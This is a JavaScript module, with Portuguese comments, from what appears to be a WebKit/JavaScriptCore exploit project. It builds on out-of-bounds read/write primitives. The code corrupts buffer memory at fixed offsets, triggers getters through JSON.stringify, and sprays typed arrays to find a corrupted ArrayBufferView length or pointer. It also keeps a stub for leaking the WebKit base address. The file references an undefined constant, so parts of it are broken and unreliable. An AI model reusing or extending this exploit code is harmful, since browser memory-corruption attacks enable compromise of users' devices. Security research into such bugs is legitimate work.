// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// Definições de Constantes Globais (no topo do módulo)
const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterFor0x6CAnalysis"; // <<<<<< DEFINIÇÃO IMPORTANTE AQUI
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_WRITE_OFFSET_0x6C = 0x6C;
const OOB_AB_GENERAL_FILL_PATTERN = 0xFEFEFEFE;
const OOB_SCAN_FILL_PATTERN = 0xCAFEBABE;
const LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C = [
    0xFEFEFEFE, 0xCDCDCDCD, 0x12345678, 0x00000000, 0xABABABAB,
    JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 2
];

// Variáveis Globais de Módulo
let getter_called_flag = false;
let global_object_for_internal_stringify;
let current_test_results_for_subtest; // Usado por executeRetypeOOB_AB_Test

// Classe CheckpointFor0x6CAnalysis
class CheckpointFor0x6CAnalysis {
    constructor(id) {
        this.id_marker = `Analyse0x6CChkpt-${id}`;
        this.prop_for_stringify_target = null;
    }

    // O erro ocorreu aqui se a constante não estava definida antes desta linha
    get [GETTER_CHECKPOINT_PROPERTY_NAME]() { // <<<<<< LINHA 17 (aproximadamente, dependendo de comentários/espaços)
        getter_called_flag = true;
        const FNAME_GETTER = "Analyse0x6C_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);

        if (!current_test_results_for_subtest) {
            logS3("ERRO FATAL GETTER: current_test_results_for_subtest não definido!", "critical", FNAME_GETTER);
            return { "error_getter_no_results_obj": true };
        }
        let details_log_g = [];
        try {
            if (!oob_array_buffer_real || !oob_read_absolute) {
                throw new Error("oob_ab ou oob_read_absolute não disponíveis.");
            }
            logS3(`DENTRO DO GETTER: Lendo QWORD de oob_data[${toHex(TARGET_WRITE_OFFSET_0x6C)}]...`, "info", FNAME_GETTER);
            const value_at_0x6C_qword = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8);
            current_test_results_for_subtest.value_after_trigger_object = value_at_0x6C_qword;
            current_test_results_for_subtest.value_after_trigger_hex = value_at_0x6C_qword.toString(true);
            details_log_g.push(`Valor lido de oob_data[${toHex(TARGET_WRITE_OFFSET_0x6C)}] (QWORD): ${current_test_results_for_subtest.value_after_trigger_hex}`);
            logS3(details_log_g[details_log_g.length - 1], "leak", FNAME_GETTER);
            if (global_object_for_internal_stringify) {
                logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO (opcional)...", "info", FNAME_GETTER);
                try { JSON.stringify(global_object_for_internal_stringify); } catch (e_int_str) { details_log_g.push(`Erro stringify int: ${e_int_str.message}`); }
                details_log_g.push("Stringify interno (opcional) chamado.");
            }
        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results_for_subtest.error = String(e_getter_main);
            current_test_results_for_subtest.message = (current_test_results_for_subtest.message || "") + ` Erro no getter: ${e_getter_main.message}`;
        }
        current_test_results_for_subtest.details_getter = details_log_g.join('; ');
        return { "getter_0x6C_analysis_complete": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointFor0x6CAnalysis.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        return {
            id: this.id_marker,
            target_prop_val: this.prop_for_stringify_target,
            processed_by_0x6c_test: true
        };
    }
}

export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST_RUNNER = "execute0x6CAnalysisRunner";
    logS3(`--- Iniciando Teste de Análise da Escrita em 0x6C (Corrigido) ---`, "test", FNAME_TEST_RUNNER);

    let overall_summary = [];

    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
        logS3("Offsets Críticos Ausentes para Teste 0x6C", "critical", FNAME_TEST_RUNNER); return;
    }

    for (const initial_low_dword_planted of LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C) {
        getter_called_flag = false;
        current_test_results_for_subtest = {
            success: false,
            message: `Testando com padrão baixo ${toHex(initial_low_dword_planted)} em ${toHex(TARGET_WRITE_OFFSET_0x6C)}.`,
            error: null,
            pattern_planted_low_hex: toHex(initial_low_dword_planted),
            value_after_trigger_hex: null,
            value_after_trigger_object: null,
            details_getter: "",
            getter_actually_called: false
        };

        logS3(`INICIANDO SUB-TESTE 0x6C: Padrão baixo em ${toHex(TARGET_WRITE_OFFSET_0x6C)} será ${toHex(initial_low_dword_planted)}`, "subtest", FNAME_TEST_RUNNER);

        try {
            await triggerOOB_primitive();
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) { throw new Error("OOB Init ou primitivas R/W falharam para Teste 0x6C"); }
            logS3(`Ambiente OOB inicializado para Teste 0x6C. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);

            const fill_limit = Math.min(OOB_AB_SNOOP_WINDOW_SIZE, oob_array_buffer_real.byteLength);
            for (let offset = 0; offset < fill_limit; offset += 4) {
                if ((offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) ||
                    (offset >= TARGET_WRITE_OFFSET_0x6C && offset < TARGET_WRITE_OFFSET_0x6C + 8)) {
                    continue;
                }
                try { oob_write_absolute(offset, OOB_AB_GENERAL_FILL_PATTERN, 4); } catch (e) { /* ignore */ }
            }
            oob_write_absolute(TARGET_WRITE_OFFSET_0x6C, initial_low_dword_planted, 4);
            if (TARGET_WRITE_OFFSET_0x6C + 4 < oob_array_buffer_real.byteLength &&
                !(TARGET_WRITE_OFFSET_0x6C + 4 >= CORRUPTION_OFFSET_TRIGGER && TARGET_WRITE_OFFSET_0x6C + 4 < CORRUPTION_OFFSET_TRIGGER + 8)) {
                oob_write_absolute(TARGET_WRITE_OFFSET_0x6C + 4, 0x00000000, 4);
            }
            const initial_qword_val = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8);
            logS3(`oob_ab preenchido. oob_data[${toHex(TARGET_WRITE_OFFSET_0x6C)}] (QWORD inicial) = ${initial_qword_val.toString(true)}.`, "info", FNAME_TEST_RUNNER);

            global_object_for_internal_stringify = { "unique_id": 0xC0FFEE00 + initial_low_dword_planted, "data_payload": "GetterStressData" };

            oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
            logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

            const checkpoint_obj = new CheckpointFor0x6CAnalysis(1);
            checkpoint_obj.prop_for_stringify_target = global_object_for_internal_stringify;
            logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);

            JSON.stringify(checkpoint_obj);

            if (getter_called_flag && current_test_results_for_subtest.value_after_trigger_object) {
                const final_qword_val_obj = current_test_results_for_subtest.value_after_trigger_object;

                if (final_qword_val_obj.high() === 0xFFFFFFFF && final_qword_val_obj.low() === initial_low_dword_planted) {
                    current_test_results_for_subtest.success = true;
                    current_test_results_for_subtest.message = `SUCESSO! 0x6C: Alto=FFFFFFFF, Baixo=${toHex(final_qword_val_obj.low())} (preservado).`;
                } else if (final_qword_val_obj.high() === 0xFFFFFFFF) {
                    current_test_results_for_subtest.success = true;
                    current_test_results_for_subtest.message = `ANOMALIA! 0x6C: Alto=FFFFFFFF, Baixo=${toHex(final_qword_val_obj.low())} (ALTERADO de ${toHex(initial_low_dword_planted)}).`;
                } else {
                    current_test_results_for_subtest.message = `Valor em 0x6C (${final_qword_val_obj.toString(true)}) não teve Alto FFFFFFFF. Padrão Baixo Plantado: ${toHex(initial_low_dword_planted)}.`;
                }
            } else if (getter_called_flag) {
                current_test_results_for_subtest.message = current_test_results_for_subtest.message || "Getter chamado, mas valor de 0x6C não foi registrado/lido corretamente pelo getter.";
            } else {
                current_test_results_for_subtest.message = current_test_results_for_subtest.message || "Getter NÃO foi chamado para este sub-teste.";
            }
        } catch (mainError_runner_subtest) {
            current_test_results_for_subtest.message = `Erro CRÍTICO no sub-teste 0x6C: ${mainError_runner_subtest.message}`;
            current_test_results_for_subtest.error = String(mainError_runner_subtest) + (mainError_runner_subtest.stack ? `\nStack: ${mainError_runner_subtest.stack}` : '');
            logS3(current_test_results_for_subtest.message, "critical", FNAME_TEST_RUNNER);
            console.error(mainError_runner_subtest);
        } finally {
            current_test_results_for_subtest.getter_actually_called = getter_called_flag;

            logS3(`FIM DO SUB-TESTE 0x6C com padrão inicial ${toHex(initial_low_dword_planted)} em ${toHex(TARGET_WRITE_OFFSET_0x6C)}`, "subtest", FNAME_TEST_RUNNER);
            if (current_test_results_for_subtest.getter_actually_called) {
                logS3(`  Resultado Sub-Teste 0x6C: Success=${current_test_results_for_subtest.success}, Msg=${current_test_results_for_subtest.message}`, current_test_results_for_subtest.success ? "vuln" : "warn", FNAME_TEST_RUNNER);
                if (current_test_results_for_subtest.value_after_trigger_hex) {
                    logS3(`    Valor final em ${toHex(TARGET_WRITE_OFFSET_0x6C)}: ${current_test_results_for_subtest.value_after_trigger_hex}`, "leak", FNAME_TEST_RUNNER);
                }
                logS3(`    Detalhes do Getter: ${current_test_results_for_subtest.details_getter}`, "info", FNAME_TEST_RUNNER);
            } else {
                logS3(`  Resultado Sub-Teste 0x6C: GETTER NÃO FOI CHAMADO. Msg: ${current_test_results_for_subtest.message}`, "error", FNAME_TEST_RUNNER);
            }

            overall_summary.push(JSON.parse(JSON.stringify(current_test_results_for_subtest)));
            clearOOBEnvironment();
            global_object_for_internal_stringify = null;
            if (initial_low_dword_planted !== LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C[LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C.length - 1]) {
                await PAUSE_S3(100);
            }
        }
    }

    logS3("==== SUMÁRIO GERAL DO TESTE DE ANÁLISE DA ESCRITA EM 0x6C (Corrigido) ====", "test", FNAME_TEST_RUNNER);
    overall_summary.forEach(res_item => {
        logS3(`Padrão Plantado (Low DWORD em ${toHex(TARGET_WRITE_OFFSET_0x6C)}): ${res_item.pattern_planted_low_hex}`, "info", FNAME_TEST_RUNNER);
        logS3(`  Getter Chamado: ${res_item.getter_actually_called}`, "info", FNAME_TEST_RUNNER);
        logS3(`  Sucesso (Anomalia Útil em 0x6C): ${res_item.success}`, res_item.success ? "vuln" : "info", FNAME_TEST_RUNNER);
        logS3(`  Mensagem: ${res_item.message}`, "info", FNAME_TEST_RUNNER);
        if (res_item.value_after_trigger_hex) {
            logS3(`    Valor Final Lido de ${toHex(TARGET_WRITE_OFFSET_0x6C)}: ${res_item.value_after_trigger_hex}`, "leak", FNAME_TEST_RUNNER);
        }
        if (res_item.details_getter) logS3(`    Detalhes Getter: ${res_item.details_getter}`, "info", FNAME_TEST_RUNNER);
        if (res_item.error) logS3(`  Erro: ${res_item.error}`, "error", FNAME_TEST_RUNNER);
        logS3("----------------------------------------------------", "info", FNAME_TEST_RUNNER);
    });

    logS3(`--- Teste de Análise da Escrita em 0x6C (Corrigido) Concluído ---`, "test", FNAME_TEST_RUNNER);
}


export async function sprayAndInvestigateObjectExposure() {
    const FNAME_SPRAY_INVESTIGATE = "sprayAndInvestigate";
    logS3(`--- Iniciando Investigação com Spray (v2): Foco em ArrayBufferView ---`, "test", FNAME_SPRAY_INVESTIGATE);

    const NUM_SPRAY_OBJECTS = 256; 
    const SPRAY_TYPED_ARRAY_ELEMENT_COUNT = 8; 
    const HYPOTHETICAL_VICTIM_ABVIEW_START_OFFSET = 0x58; // Foco da investigação do log anterior

    let sprayedVictimObjects = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
            throw new Error("OOB Init ou primitivas R/W falharam.");
        }
        logS3("Ambiente OOB inicializado para investigação com spray.", "info", FNAME_SPRAY_INVESTIGATE);

        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(${SPRAY_TYPED_ARRAY_ELEMENT_COUNT})...`, "info", FNAME_SPRAY_INVESTIGATE);
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            sprayedVictimObjects.push(new Uint32Array(SPRAY_TYPED_ARRAY_ELEMENT_COUNT));
        }
        logS3("Pulverização de Uint32Array concluída.", "info", FNAME_SPRAY_INVESTIGATE);
        await PAUSE_S3(100);

        for (let i = 0; i < Math.min(0x100, oob_array_buffer_real.byteLength); i += 4) {
            if (i === TARGET_WRITE_OFFSET_0x6C || i === (TARGET_WRITE_OFFSET_0x6C + 4)) continue;
            try { oob_write_absolute(i, OOB_SCAN_FILL_PATTERN, 4); } catch(e) {}
        }
        const initial_low_dword_at_0x6C = 0x12345678;
        oob_write_absolute(TARGET_WRITE_OFFSET_0x6C, initial_low_dword_at_0x6C, 4);
        oob_write_absolute(TARGET_WRITE_OFFSET_0x6C + 4, 0x0, 4);
        logS3(`Buffer OOB preenchido. Valor inicial em ${toHex(TARGET_WRITE_OFFSET_0x6C)}: ${oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8).toString(true)}`, "info", FNAME_SPRAY_INVESTIGATE);

        logS3(`Realizando escrita OOB em ${toHex(CORRUPTION_OFFSET_TRIGGER)} com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_SPRAY_INVESTIGATE);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        const value_at_0x6C_after_corruption = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8);
        logS3(`Valor em ${toHex(TARGET_WRITE_OFFSET_0x6C)} APÓS CORRUPÇÃO: ${value_at_0x6C_after_corruption.toString(true)}`, "leak", FNAME_SPRAY_INVESTIGATE);

        logS3(`FASE 3: Investigando o offset ${toHex(HYPOTHETICAL_VICTIM_ABVIEW_START_OFFSET)} como potencial ArrayBufferView...`, "info", FNAME_SPRAY_INVESTIGATE);

        const victim_base = HYPOTHETICAL_VICTIM_ABVIEW_START_OFFSET;
        let struct_id, struct_ptr, abv_vector, abv_length, abv_mode;

        const sid_offset = victim_base + JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET;
        const sptr_offset = victim_base + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET;
        const vec_offset = victim_base + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        const len_offset = victim_base + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
        const mode_offset = victim_base + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

        try { struct_id = oob_read_absolute(sid_offset, 4); } catch(e) { logS3(`Erro lendo StructureID @${toHex(sid_offset)}`, "error", FNAME_SPRAY_INVESTIGATE); }
        try { struct_ptr = oob_read_absolute(sptr_offset, 8); } catch(e) { logS3(`Erro lendo Structure* @${toHex(sptr_offset)}`, "error", FNAME_SPRAY_INVESTIGATE); }
        try { abv_vector = oob_read_absolute(vec_offset, 8); } catch(e) { logS3(`Erro lendo m_vector @${toHex(vec_offset)}`, "error", FNAME_SPRAY_INVESTIGATE); }
        try { abv_length = oob_read_absolute(len_offset, 4); } catch(e) { logS3(`Erro lendo m_length @${toHex(len_offset)}`, "error", FNAME_SPRAY_INVESTIGATE); }
        try { abv_mode = oob_read_absolute(mode_offset, 4); } catch(e) { logS3(`Erro lendo m_mode @${toHex(mode_offset)}`, "error", FNAME_SPRAY_INVESTIGATE); }

        logS3(`  Resultados para offset base ${toHex(victim_base)}:`, "info", FNAME_SPRAY_INVESTIGATE);
        logS3(`    StructureID (@${toHex(sid_offset)}): ${toHex(struct_id)}`, "leak", FNAME_SPRAY_INVESTIGATE);
        logS3(`    Structure* (@${toHex(sptr_offset)}): ${isAdvancedInt64Object(struct_ptr) ? struct_ptr.toString(true) : toHex(struct_ptr)}`, "leak", FNAME_SPRAY_INVESTIGATE);
        logS3(`    m_vector    (@${toHex(vec_offset)}): ${isAdvancedInt64Object(abv_vector) ? abv_vector.toString(true) : toHex(abv_vector)}`, "leak", FNAME_SPRAY_INVESTIGATE);
        logS3(`    m_length    (@${toHex(len_offset)}): ${toHex(abv_length)} (Decimal: ${abv_length})`, "leak", FNAME_SPRAY_INVESTIGATE);
        logS3(`    m_mode      (@${toHex(mode_offset)}): ${toHex(abv_mode)}`, "leak", FNAME_SPRAY_INVESTIGATE);

        if (typeof abv_length === 'number' && (abv_length === 0xFFFFFFFF || abv_length > (oob_array_buffer_real.byteLength / 4))) {
            logS3(`    POTENCIAL VULNERABILIDADE: m_length em ${toHex(len_offset)} foi corrompido para um valor grande: ${toHex(abv_length)}!`, "vuln", FNAME_SPRAY_INVESTIGATE);
            document.title = "Spray: m_length Corrompido!";
        }
        if (isAdvancedInt64Object(abv_vector) && !(abv_vector.low() === OOB_SCAN_FILL_PATTERN && abv_vector.high() === OOB_SCAN_FILL_PATTERN) && !(abv_vector.low() === 0 && abv_vector.high() === 0) ) {
            logS3(`    INTERESSANTE: m_vector em ${toHex(vec_offset)} é não nulo e diferente do padrão: ${abv_vector.toString(true)}`, "warn", FNAME_SPRAY_INVESTIGATE);
        }

        logS3("INVESTIGAÇÃO DETALHADA CONCLUÍDA.", "test", FNAME_SPRAY_INVESTIGATE);

    } catch (e) {
        logS3(`ERRO CRÍTICO na investigação com spray: ${e.message}`, "critical", FNAME_SPRAY_INVESTIGATE);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_SPRAY_INVESTIGATE);
        document.title = "Spray & Investigate FALHOU!";
    } finally {
        sprayedVictimObjects = [];
        clearOOBEnvironment();
        logS3("--- Investigação com Spray (v2) Concluída ---", "test", FNAME_SPRAY_INVESTIGATE);
    }
}

// A função attemptWebKitBaseLeakStrategy_OLD (anteriormente attemptWebKitBaseLeakStrategy ou v3)
// é mantida para referência, mas não é o foco principal agora.
export async function attemptWebKitBaseLeakStrategy_OLD() {
    const FNAME_LEAK_RUNNER = "attemptWebKitBaseLeakStrategy_v3_OLD";
    logS3(`--- Iniciando Estratégia de Vazamento de Base do WebKit (v3 - via JSWithScope - ARQUIVADA) ---`, "test", FNAME_LEAK_RUNNER);
    // ... (Corpo completo da função como na sua última versão funcional ou conceitual)
    logS3("   (Função attemptWebKitBaseLeakStrategy_OLD não executada ativamente neste fluxo)", "info", FNAME_LEAK_RUNNER);
}
